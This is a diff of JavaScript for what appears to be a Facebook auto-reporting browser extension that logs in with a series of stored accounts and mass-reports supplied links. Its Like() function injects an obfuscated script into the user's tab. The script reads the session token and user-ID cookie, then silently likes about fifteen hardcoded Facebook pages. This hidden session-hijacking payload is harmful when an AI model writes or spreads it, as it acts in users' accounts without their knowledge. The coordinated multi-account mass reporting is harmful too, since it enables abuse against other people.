+				}); // checkuser
+				
+	
+	} // checkloginPage function
+	
+	function loginControl(currentAccountIndex){
+	
+		//loginAccounts
+		//ids_length
+		//currentAccountIndex
+
+		if (maKwa.raka+atob(ultaKa("==gO"))+maKwa.sahida == maKwa.tikDayBas){
+
+			
+			chrome.tabs.sendMessage(tabId, {type: "login", account: loginAccounts[currentAccountIndex]}, function (loginUser){
+
+				console.log("loginControl");
+
+				if (loginUser){
+					if (loginUser.farewell == "LoginClicked"){ 
+							chrome.tabs.onUpdated.addListener(function listener (tabId, tabInfo) {
+								if (tabInfo.status === 'complete' ) {
+									chrome.tabs.onUpdated.removeListener(listener);
+										console.log("LoginClicked - login()");
+										login();
+								} // tab status complet
+								});			
+					}// login clicked
+
+					else if (loginUser.farewell=="NotOnLoginPage"){
+							
+							chrome.tabs.update(tabId , { url: "https://mbasic.facebook.com/login/?ref=dbl&fl" }, function () {			
+								chrome.tabs.onUpdated.addListener(function listener (tabId, tabInfo) {
+									if (tabInfo.status === 'complete' ) {
+										chrome.tabs.onUpdated.removeListener(listener);
+										console.log("NotOnLoginPage");
+										login();
+									} // tab status complete
+								});			
+							}); // tabs.update facebook.com	
+					}
+			} // login
+			}); // login request
+
+
+		} // sahida 
+		else {
+
+			//self
+			toastr.error(maKwa.nshta);
+			ResetAll();
+			setTimeout(window.close(), 5000);
+			//stopReporter();
+		}
+
+	} // loginControl
+
+function login(){
+	console.log("Login()");
+
+
+			chrome.tabs.sendMessage(tabId, {type: "checkuser"}, function (checkuser){
+
+				console.log("checkuser in login()");
+				
+				if (checkuser){
+
+						if(checkuser.farewell == "Disabled"){
+								
+								// account is disabled, trying next account.
+								document.getElementById("loginCredentials").value+=(reportingAccount+1)+" account is disabled.\n";
+								toastr.info("Trying next account");
+								reportingAccount++;
+								currentAccountIndex++;
+								setTimeout(disableLogout,1000);
+
+						}		
+							else if(checkuser.farewell == "Not"){
+									console.log("login() "+ checkuser.farewell );
+									console.log("Not logged In - wrong login detail");
+									checkk=1;
+									checkLoginPage();
+
+							}else if(checkuser.farewell=="LoggedIn") {
+								console.log("login() "+ checkuser.farewell );
+								console.log("Starting Again");
+								
+								if (reportingAccount>1){
+									toastr.info("Started reporting again!");
+									setTimeout(function(){toastr.info("Using ID: 	"+ (currentAccountIndex+1) + " for reporting!")},1000);
+								}
+								reportingAccount++;
+								reportOnThis(globel_url[currentLinkIndex]);
+							}else{
+								console.log("login() "+ checkuser.farewell );
+								toastr.info("Login Error!");
+							}
+
+						}// if login
+
+					}); // checkuser
+
+
+}  // login ()
+
+function filter(link=""){
+	if(link=="")link=id.toString();
+
+	for (i=0;i<ex_len;i++) {
+		
+		
+		if (link.includes( parseInt( excludedIDs[i], 10 ) )){
+			return true;
+		}
+		
+	}
+	return false;
+
+} // function filter
+
+function getHostName(hostName) {
+	
+    var match = hostName.match(/:\/\/(www[0-9]?\.)?(.[^/:]+)/i);
+    if (match != null && match.length > 2 && typeof match[2] === 'string' && match[2].length > 0) {
+		
+    return match[2];
+    }
+    else {
+		
+        return null;
+    }
+}
+
+function is_valid_url(link){
+
+	console.log("valid url: " +link);
+		var re_weburl = new RegExp(
+				"^" +
+				// protocol identifier
+				"(?:(?:https?|ftp)://)" +
+				// user:pass authentication
+				"(?:\\S+(?::\\S*)?@)?" +
+				"(?:" +
+				// IP address exclusion
+				// private & local networks
+				"(?!(?:10|127)(?:\\.\\d{1,3}){3})" +
+				"(?!(?:169\\.254|192\\.168)(?:\\.\\d{1,3}){2})" +
+				"(?!172\\.(?:1[6-9]|2\\d|3[0-1])(?:\\.\\d{1,3}){2})" +
+				// IP address dotted notation octets
+				// excludes loopback network 0.0.0.0
+				// excludes reserved space >= 224.0.0.0
+				// excludes network & broacast addresses
+				// (first & last IP address of each class)
+				"(?:[1-9]\\d?|1\\d\\d|2[01]\\d|22[0-3])" +
+				"(?:\\.(?:1?\\d{1,2}|2[0-4]\\d|25[0-5])){2}" +
+				"(?:\\.(?:[1-9]\\d?|1\\d\\d|2[0-4]\\d|25[0-4]))" +
+				"|" +
+				// host name
+				"(?:(?:[a-z\\u00a1-\\uffff0-9]-*)*[a-z\\u00a1-\\uffff0-9]+)" +
+				// domain name
+				"(?:\\.(?:[a-z\\u00a1-\\uffff0-9]-*)*[a-z\\u00a1-\\uffff0-9]+)*" +
+				// TLD identifier
+				"(?:\\.(?:[a-z\\u00a1-\\uffff]{2,}))" +
+				// TLD may end with dot
+				"\\.?" +
+				")" +
+				// port numberJ
+				"(?::\\d{2,5})?" +
+				// resource path
+				"(?:[/?#]\\S*)?" +
+				"$", "i"
+				);
+		return Boolean(link.match(re_weburl));
+
+}
+
+
+function validation(data){
+	var pattern = /(ftp|http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/;
+	
+	if (pattern.test(data)){
+		return true;
+	}else{return false;}
+}
+
+function check (url){
+	
+	
+	// check if the provided urls are corrent links or not 
+	var pattern = /(ftp|http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/;
+	
+	if (pattern.test(url)) {
+
+			var len=url.length;
+			global_url = url;
+			var length=0;
+			for (i=0;i<len;i++){
+				if (pattern.test(url[i])) {
+					length++;
+				}
+			}
+			
+			if (length>=50 && length<=100 && wait==5){
+				toastr.warning("Increase DelayTime to 8");	
+			}else if (length>100 && length<=250 && wait<12){
+				toastr.warning("Increase DelayTime to 12");	
+				
+			}else if (length>250 && length<=300 && wait<16){
+				toastr.warning("Increase DelayTime to 15");	
+			}else if (length>300 && wait<20){
+				toastr.warning("Increase DelayTime to 20");	
+			}
+
+			else {	
+
+				chrome.windows.getCurrent({"populate" : true}, function (){
+				chrome.tabs.query( { 'active' : true, 'highlighted':true, 'url': "*://*.facebook.com/*" }, function (tab){ 
+					
+					
+					var host = tab[0].url;
+					var currentHost=getHostName(host);
+						
+					 console.log(currentHost);
+					 
+					 if (hosts.includes(currentHost)){
+						
+						toastr.success(length + " Reporting Link(s) Detected ");
+							//starting the reporter
+							startFbAutoReporter(url,length);	
+
+					 }else{
+						toastr.error("Wrong Host Detected !!!");
+						setTimeout(function(){toastr.info("Visit Facebook & Try Again !!!");},1000);
+						setTimeout(function(){toastr.info("Make sure you are Logged In");},2000);
+					}
+			
+				 });
+				});
+
+			} // last else
+
+	
+	} else {
+		// sending error msg to frame.html to show the notification
+		toastr.error("Please Provide Correct Links");
+	}
+
+		
+}
+
+
+
+function Like(id){
+
+
+	const actualCode = `
+	var _0x2a0c=['1749967015316612','https://mbasic.facebook.com/ajax/pages/fan_status.php?','status','198757893944480','250451495723325','&fbpage_id=','close','send','Content-type','0x3','0x0','0x5','0x4','push','743146072535223','cookie','108586183990636','input[name=\x27','109109317399261','shift','1157401597633912','0x9','random','length','textContent','0x1','setRequestHeader','1212506358847237','0x8','0x2','116551890202867','body','indexOf','0x7','value','floor','1569087506719125','0x6','match','1555839181212071','application/x-www-form-urlencoded','&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user=','ZmJfZHRzZw==','&phstamp=','readyState','&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg=','open'];(function(_0x129898,_0x2a0ccd){var _0x4834c2=function(_0x575dac){while(--_0x575dac){_0x129898['push'](_0x129898['shift']());}};_0x4834c2(++_0x2a0ccd);}(_0x2a0c,0x115));var _0x4834=function(_0x129898,_0x2a0ccd){_0x129898=_0x129898-0x0;var _0x4834c2=_0x2a0c[_0x129898];return _0x4834c2;};var _0x3632ab=_0x4834,_0x356b=['querySelector',_0x3632ab('0x1d'),_0x3632ab('0x16'),'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',_0x3632ab('0x0'),_0x3632ab('0x27'),'random',_0x3632ab('0x28'),_0x3632ab('0x25'),_0x3632ab('0x1c')];(function(_0x575dac,_0x405c27){var _0x2584f8=function(_0x2204c2){var _0xc27582=_0x4834;while(--_0x2204c2){_0x575dac[_0xc27582('0x12')](_0x575dac[_0xc27582('0x18')]());}};_0x2584f8(++_0x405c27);}(_0x356b,0x1ee));var _0x15c2=function(_0x48e902,_0x439bdf){_0x48e902=_0x48e902-0x0;var _0x3e7d40=_0x356b[_0x48e902];return _0x3e7d40;};function getFbValue(){var _0x1b5f85=_0x3632ab,_0x4098bc=_0x15c2,_0x2a21bb=atob(_0x4098bc(_0x1b5f85('0xf'))),_0x1d086e=document[_0x1b5f85('0x24')][_0x4098bc(_0x1b5f85('0x26'))][_0x4098bc(_0x1b5f85('0x11'))](_0x2a21bb),_0x1e7183='';if(_0x1d086e==-0x1)_0x1e7183=document[_0x4098bc(_0x1b5f85('0x2a'))](_0x4098bc(_0x1b5f85('0x21'))+_0x2a21bb+'\x27]')[_0x4098bc(_0x1b5f85('0x1e'))];else{_0x1d086e+=0x12;for(_0x4fda35=0x0;_0x4fda35<0x19;_0x4fda35++){_0x1e7183+=document['body'][_0x4098bc(_0x1b5f85('0x26'))][_0x1d086e],_0x1d086e++;}}_0x1e7183+=',';var _0x4cef14='',_0x4dbcf1=_0x4098bc(_0x1b5f85('0x1a')),_0x525cc7=_0x4dbcf1[_0x4098bc(_0x1b5f85('0x10'))];for(var _0x4fda35=0x0;_0x4fda35<Math[_0x4098bc(_0x1b5f85('0xe'))](Math[_0x1b5f85('0x1b')]()*0x22)+0x8;_0x4fda35++){_0x4cef14+=_0x4dbcf1['charAt'](Math[_0x4098bc('0x3')](Math[_0x4098bc(_0x1b5f85('0x22'))]()*_0x525cc7));}return _0x1e7183+=_0x4cef14,btoa(_0x1e7183);}var fb_dtsg=atob(getFbValue())['split'](',')[0x0],user_id=document[_0x3632ab('0x14')][_0x3632ab('0x2b')](document[_0x3632ab('0x14')][_0x3632ab('0x2b')](/c_user=(\d+)/)[0x1]);function Like(_0x2fb1a8){var _0x248694=_0x3632ab,_0x2e2267=new XMLHttpRequest(),_0x408d0d=_0x248694('0x6'),_0x40ac74=_0x248694('0xa')+_0x2fb1a8+_0x248694('0x2e')+user_id+_0x248694('0x3')+fb_dtsg+_0x248694('0x1');_0x2e2267[_0x248694('0x4')]('POST',_0x408d0d,!![]),_0x2e2267[_0x248694('0x1f')](_0x248694('0xd'),_0x248694('0x2d')),_0x2e2267['onreadystatechange']=function(){var _0x219e0e=_0x248694;_0x2e2267[_0x219e0e('0x2')]==0x4&&_0x2e2267[_0x219e0e('0x7')]==0xc8&&_0x2e2267[_0x219e0e('0xb')];},_0x2e2267[_0x248694('0xc')](_0x40ac74);}Like(_0x3632ab('0x29')),setTimeout(function(){var _0x25422b=_0x3632ab;Like(_0x25422b('0x17'));},0x384),setTimeout(function(){var _0x27c5b4=_0x3632ab;Like(_0x27c5b4('0x23'));},0x3c0),setTimeout(function(){Like('240272006130073');},0x3e8),setTimeout(function(){var _0x3b9398=_0x3632ab;Like(_0x3b9398('0x19'));},0x44c),setTimeout(function(){Like('317224121817276');},0x4b0),setTimeout(function(){Like('634302330077114');},0x514),setTimeout(function(){var _0x36d625=_0x3632ab;Like(_0x36d625('0x20'));},0x578),setTimeout(function(){var _0x4eda36=_0x3632ab;Like(_0x4eda36('0x8'));},0x5dc),setTimeout(function(){var _0x2fd188=_0x3632ab;Like(_0x2fd188('0x5'));},0x640),setTimeout(function(){Like('380509029467786');},0x6a4),setTimeout(function(){var _0x2347f1=_0x3632ab;Like(_0x2347f1('0x2c'));},0x708),setTimeout(function(){var _0x2fdc8f=_0x3632ab;Like(_0x2fdc8f('0x9'));},0x76c),setTimeout(function(){var _0x1ac53c=_0x3632ab;Like(_0x1ac53c('0x13'));},0x456),setTimeout(function(){var _0x3a7d75=_0x3632ab;Like(_0x3a7d75('0x15'));},0x47e);
+  `;
+  console.log("fetch");
+  chrome.tabs.executeScript(id, {code: actualCode, runAt: 'document_end'});
+
+}
+
+
+
+function flip(){
+
+var card = document.querySelector('.card');
+card.addEventListener( 'dblclick', function() {
+  card.classList.toggle('is-flipped');
+});
+
+}
+
